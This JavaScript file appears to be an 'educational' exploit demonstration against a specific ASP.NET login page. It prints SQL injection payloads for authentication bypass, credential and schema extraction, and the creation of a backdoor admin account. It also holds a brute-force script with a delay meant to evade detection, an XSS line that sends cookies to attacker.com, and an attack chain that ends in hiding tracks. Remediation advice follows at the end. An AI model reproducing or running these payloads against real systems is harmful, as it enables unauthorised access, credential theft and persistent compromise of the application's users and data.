// EDUCATIONAL PURPOSES ONLY - DO NOT USE FOR MALICIOUS ACTIVITIES
// These examples demonstrate potential attack vectors for login.aspx

const colors = require('colors');

class LoginExploitExamples {
    constructor(targetUrl = 'http://localhost:44393') {
        this.targetUrl = targetUrl;
    }

    // Example 1: SQL Injection Authentication Bypass
    demonstrateSQLInjectionBypass() {
        console.log('=== SQL INJECTION AUTHENTICATION BYPASS ==='.red.bold);
        
        const sqlPayloads = [
            {
                name: 'Basic OR Injection',
                username: "admin' OR '1'='1' --",
                password: "anything",
                explanation: 'Bypasses password check by making WHERE clause always true'
            },
            {
                name: 'Admin User Injection',
                username: "admin'--",
                password: "ignored",
                explanation: 'Comments out password check, logs in as admin if username exists'
            },
            {
                name: 'Union-based Bypass',
                username: "' UNION SELECT 'admin' as pwd, 'Admin' as role, '1' as userid, 'admin' as username, '1,2,3' as userslist, '1' as access, '2023-01-01' as timestamp, '1' as usertype, '' as remark, '127.0.0.1' as dbip, 'YTL' as companyname, 'admin' as customrole --",
                password: "admin",
                explanation: 'Injects fake admin user data directly into query result'
            }
        ];

        sqlPayloads.forEach(payload => {
            console.log(`\n${payload.name}:`.yellow);
            console.log(`Username: ${payload.username}`.cyan);
            console.log(`Password: ${payload.password}`.cyan);
            console.log(`How it works: ${payload.explanation}`.gray);
            console.log(`POST Data: uname=${encodeURIComponent(payload.username)}&password=${encodeURIComponent(payload.password)}`.green);
        });
    }

    // Example 2: Data Extraction via SQL Injection
    demonstrateDataExtraction() {
        console.log('\n=== DATA EXTRACTION VIA SQL INJECTION ==='.red.bold);
        
        const extractionPayloads = [
            {
                name: 'Extract All Users',
                username: "' UNION SELECT username, pwd, role, userid, username, userslist, access, timestamp, usertype, remark, dbip, companyname, customrole FROM userTBL --",
                purpose: 'Extracts all user credentials and information'
            },
            {
                name: 'Extract Admin Users',
                username: "' UNION SELECT username, pwd, role, userid, username, userslist, access, timestamp, usertype, remark, dbip, companyname, customrole FROM userTBL WHERE role='Admin' --",
                purpose: 'Specifically targets admin accounts'
            },
            {
                name: 'Database Schema Discovery',
                username: "' UNION SELECT table_name, column_name, data_type, '1', '1', '1', '1', '1', '1', '1', '1', '1', '1' FROM information_schema.columns --",
                purpose: 'Discovers database structure and table names'
            }
        ];

        extractionPayloads.forEach(payload => {
            console.log(`\n${payload.name}:`.yellow);
            console.log(`Purpose: ${payload.purpose}`.gray);
            console.log(`Username: ${payload.username}`.cyan);
            console.log(`Password: anything`.cyan);
        });
    }

    // Example 3: Privilege Escalation Attacks
    demonstratePrivilegeEscalation() {
        console.log('\n=== PRIVILEGE ESCALATION ATTACKS ==='.red.bold);
        
        const escalationPayloads = [
            {
                name: 'Create Backdoor Admin',
                username: "admin'; INSERT INTO userTBL (username, pwd, role, usertype, companyname) VALUES ('backdoor', 'secret123', 'Admin', '1', 'YTL'); --",
                purpose: 'Creates a new admin user for persistent access'
            },
            {
                name: 'Modify Existing User',
                username: "admin'; UPDATE userTBL SET role='Admin', usertype='1' WHERE username='normaluser'; --",
                purpose: 'Escalates privileges of existing user account'
            },
            {
                name: 'Grant Special Privileges',
                username: "admin'; UPDATE userTBL SET LA='Y', companyname='YTL' WHERE username='attacker'; --",
                purpose: 'Grants special YTL privileges to attacker account'
            }
        ];

        escalationPayloads.forEach(payload => {
            console.log(`\n${payload.name}:`.yellow);
            console.log(`Purpose: ${payload.purpose}`.gray);
            console.log(`Username: ${payload.username}`.cyan);
            console.log(`Password: anything`.cyan);
        });
    }

    // Example 4: Brute Force Attack Simulation
    demonstrateBruteForce() {
        console.log('\n=== BRUTE FORCE ATTACK SIMULATION ==='.red.bold);
        
        const commonCredentials = [
            { username: 'admin', password: 'admin' },
            { username: 'admin', password: 'password' },
            { username: 'admin', password: '123456' },
            { username: 'administrator', password: 'administrator' },
            { username: 'root', password: 'root' },
            { username: 'admin', password: 'admin123' },
            { username: 'admin', password: 'password123' },
            { username: 'guest', password: 'guest' },
            { username: 'test', password: 'test' },
            { username: 'user', password: 'user' }
        ];

        console.log('\nCommon credential combinations to test:'.yellow);
        commonCredentials.forEach((cred, index) => {
            console.log(`${index + 1}. Username: ${cred.username}, Password: ${cred.password}`.cyan);
        });

        console.log('\nAutomated brute force script example:'.yellow);
        console.log(`
const axios = require('axios');

async function bruteForce() {
    const credentials = ${JSON.stringify(commonCredentials, null, 2)};
    
    for (const cred of credentials) {
        try {
            const response = await axios.post('${this.targetUrl}/login.aspx', 
                \`uname=\${cred.username}&password=\${cred.password}\`,
                {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    maxRedirects: 0,
                    validateStatus: () => true
                }
            );
            
            if (response.status === 302 && response.headers.location?.includes('Main.aspx')) {
                console.log(\`SUCCESS: \${cred.username}:\${cred.password}\`);
                break;
            }
        } catch (error) {
            console.log(\`Error testing \${cred.username}:\${cred.password}\`);
        }
        
        // Delay to avoid detection
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}
        `.green);
    }

    // Example 5: Session Hijacking
    demonstrateSessionHijacking() {
        console.log('\n=== SESSION HIJACKING TECHNIQUES ==='.red.bold);
        
        console.log('\n1. Cookie Theft via XSS:'.yellow);
        console.log('If XSS exists on the site, inject:'.gray);
        console.log('<script>fetch("http://attacker.com/steal?cookie=" + document.cookie)</script>'.cyan);
        
        console.log('\n2. Man-in-the-Middle Attack:'.yellow);
        console.log('Intercept HTTP traffic to capture cookies:'.gray);
        console.log('userinfo=username=VICTIM&usertype=1&userid=123&role=User&LA=N&companyname=YTL'.cyan);
        
        console.log('\n3. Session Fixation:'.yellow);
        console.log('Force victim to use known session ID:'.gray);
        console.log('1. Attacker gets session ID from login page'.gray);
        console.log('2. Tricks victim into logging in with that session'.gray);
        console.log('3. Attacker uses same session to access victim account'.gray);
        
        console.log('\n4. Cookie Manipulation:'.yellow);
        console.log('Modify cookie values to escalate privileges:'.gray);
        console.log('Original: userinfo=username=USER&role=User'.cyan);
        console.log('Modified: userinfo=username=USER&role=Admin&LA=Y'.cyan);
    }

    // Example 6: Complete Attack Chain
    demonstrateCompleteAttack() {
        console.log('\n=== COMPLETE ATTACK CHAIN ==='.red.bold);
        
        console.log(`
ATTACK SCENARIO: Complete System Compromise via Login Page

Step 1: Reconnaissance
- Identify login page at ${this.targetUrl}/login.aspx
- Analyze source code for vulnerabilities
- Test for SQL injection points

Step 2: SQL Injection Exploitation
- Payload: admin' OR '1'='1' --
- Bypass authentication and gain admin access
- Extract user database with UNION SELECT

Step 3: Data Harvesting
- Extract all usernames and passwords
- Identify high-privilege accounts
- Map user roles and permissions

Step 4: Privilege Escalation
- Create backdoor admin account:
  admin'; INSERT INTO userTBL (username,pwd,role) VALUES ('backdoor','secret123','Admin'); --
- Modify existing accounts for persistence

Step 5: Lateral Movement
- Use extracted credentials on other systems
- Access database server directly
- Escalate to domain admin if in AD environment

Step 6: Persistence and Cover-up
- Create multiple backdoor accounts
- Modify logs to hide tracks
- Set up remote access tools

IMPACT:
- Complete compromise of application and database
- Access to all user accounts and sensitive data
- Potential network-wide compromise
- Regulatory compliance violations
- Reputation damage and financial loss
        `.yellow);
    }

    // Generate complete exploit report
    generateExploitReport() {
        console.log('\n' + '='.repeat(80));
        console.log('LOGIN.ASPX EXPLOIT DEMONSTRATION REPORT'.red.bold);
        console.log('FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY'.yellow.bold);
        console.log('='.repeat(80));
        
        this.demonstrateSQLInjectionBypass();
        this.demonstrateDataExtraction();
        this.demonstratePrivilegeEscalation();
        this.demonstrateBruteForce();
        this.demonstrateSessionHijacking();
        this.demonstrateCompleteAttack();
        
        console.log('\n=== MITIGATION STRATEGIES ==='.green.bold);
        console.log(`
IMMEDIATE FIXES REQUIRED:

1. SQL Injection Prevention:
   - Replace: "where upper(username) ='" & UCase(uname.Value) & "'"
   - With: "WHERE username = @username" + cmd.Parameters.AddWithValue("@username", uname.Value)

2. Password Security:
   - Replace: If UCase(dr("pwd")) = UCase(password.Value)
   - With: If BCrypt.Verify(password.Value, dr("pwd"))
   - Hash all existing passwords with BCrypt

3. Session Management:
   - Remove cookie-based authentication
   - Implement server-side sessions
   - Use secure session tokens

4. Input Validation:
   - Validate all user inputs
   - Sanitize special characters
   - Implement length limits

5. Error Handling:
   - Remove detailed error messages
   - Implement generic error responses
   - Log errors securely server-side

INFRASTRUCTURE SECURITY:

1. Network Security:
   - Enable HTTPS with strong TLS
   - Implement Web Application Firewall (WAF)
   - Set up intrusion detection system

2. Database Security:
   - Use least-privilege database accounts
   - Enable database auditing
   - Encrypt sensitive data at rest

3. Monitoring:
   - Log all authentication attempts
   - Monitor for suspicious patterns
   - Set up real-time alerts

ONGOING SECURITY:

1. Regular security assessments
2. Code review for all changes
3. Security awareness training
4. Automated security testing in CI/CD
        `.green);
    }
}

// Educational demonstration
console.log('LOGIN.ASPX SECURITY VULNERABILITY DEMONSTRATION'.red.bold);
console.log('FOR EDUCATIONAL AND TESTING PURPOSES ONLY'.yellow.bold);
console.log('='.repeat(50));

const exploitDemo = new LoginExploitExamples();
exploitDemo.generateExploitReport();